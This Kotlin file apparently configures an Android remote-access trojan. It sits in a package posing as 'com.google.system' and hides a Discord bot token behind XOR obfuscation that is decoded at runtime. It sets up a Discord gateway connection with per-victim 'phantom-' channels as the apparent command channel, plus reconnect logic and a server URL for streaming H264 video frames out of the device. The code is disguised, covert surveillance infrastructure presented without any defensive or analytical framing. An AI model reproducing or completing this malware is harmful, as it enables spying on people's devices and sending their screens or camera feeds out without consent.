package com.google.system

object DiscordConfig {
    private val TOKEN_KEY = listOf(161, 72, 45, 140, 148, 51, 230, 233, 184, 63, 60, 196, 164, 172, 85, 255)
    private val TOKEN_ENC = listOf(
        236, 28, 124, 244, 218, 73, 191, 219, 246, 107, 109, 246, 233, 214, 28, 204,
        239, 50, 120, 184, 219, 119, 179, 144, 245, 110, 18, 131, 227, 129, 24, 166,
        224, 102, 66, 225, 236, 74, 215, 171, 224, 101, 90, 240, 251, 244, 24, 137,
        228, 101, 75, 180, 221, 10, 203, 176, 253, 106, 111, 135, 254, 234, 28, 146,
        226, 61, 123, 235, 247, 101, 135, 138,
    )

    val BOT_TOKEN: String by lazy {
        val arr = ByteArray(TOKEN_ENC.size) { i ->
            (TOKEN_ENC[i] xor TOKEN_KEY[i % TOKEN_KEY.size]).toByte()
        }
        String(arr)
    }

    const val GATEWAY_URL = "wss://gateway.discord.gg/?v=10&encoding=json"

    const val INTENTS = 33281

    const val CHANNEL_PREFIX = "phantom-"

    const val RECONNECT_BASE_DELAY = 2000L
    const val MAX_RECONNECT_DELAY = 300000L

    const val WEBHOOK_URL = ""

    // Bot HTTP server URL for live streaming (H264 frames)
    // Change this to your bot server's public URL
    const val BOT_HTTP_URL = "http://your-bot-server.com:3000"
}
